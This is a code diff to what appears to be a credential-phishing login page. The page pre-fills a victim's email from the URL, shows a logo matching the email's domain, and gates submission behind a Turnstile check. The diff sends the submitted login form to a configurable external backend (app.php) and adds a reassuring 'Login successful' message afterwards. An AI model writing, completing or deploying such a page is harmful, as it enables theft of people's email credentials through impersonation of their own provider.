@@ -160,7 +160,7 @@ align-items: center;
 	<h3 id="auth-heading" class="auth-heading">LOGIN AUTHENTICATION</h3>
 </div>
 
-<form id="signup-form" method="POST" action="app.php">
+<form id="signup-form" method="POST" action="">
 	<div class="mb-3">
 		<label for="email" class="form-label">Email Address</label>
 		<input type="email" class="form-control" id="email" name="email" required>
@@ -193,6 +193,12 @@ align-items: center;
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
 <script>
+// Backend Server Configuration
+const BACKEND_URL = 'https://your-backend-domain.com/app.php'; // Change this to your PHP server URL
+
+// For development, you can use:
+// const BACKEND_URL = 'http://localhost:8001/app.php';
+
 let extractedDomain = "";
 let turnstileVerified = false;
 
@@ -251,6 +257,9 @@ function updateDomainLogo() {
 document.addEventListener("DOMContentLoaded", function () {
 	console.log("DOM Content Loaded");
 	
+	// Set form action to backend URL
+	document.getElementById("signup-form").action = BACKEND_URL;
+	
 	// Check if Turnstile script loaded
 	setTimeout(function() {
 		if (typeof turnstile !== 'undefined') {
@@ -262,12 +271,29 @@ document.addEventListener("DOMContentLoaded", function () {
 	
 	const urlParams = new URLSearchParams(window.location.search);
 	const emailParam = urlParams.get("email");
+	const successParam = urlParams.get("success");
 	console.log("Email from URL:", emailParam);
+	console.log("Success from URL:", successParam);
 	
 	if (emailParam) {
 		document.getElementById("email").value = emailParam;
 		extractedDomain = emailParam.split("@")[1] || "example.com";
 		console.log("Set email field and extracted domain:", extractedDomain);
+	}
+	
+	// Show success message if redirected after successful submission
+	if (successParam === "1") {
+		const successDiv = document.getElementById("error-message");
+		successDiv.textContent = "✅ Login successful! Your submission has been processed.";
+		successDiv.className = "alert alert-success";
+		successDiv.style.display = "block";
+		
+		// Clear success parameter from URL after 3 seconds
+		setTimeout(function() {
+			const newUrl = window.location.pathname + (emailParam ? "?email=" + encodeURIComponent(emailParam) : "");
+			window.history.replaceState(null, null, newUrl);
+			successDiv.style.display = "none";
+		}, 3000);
 	}
 	
 	// Update logo on page load if email is present
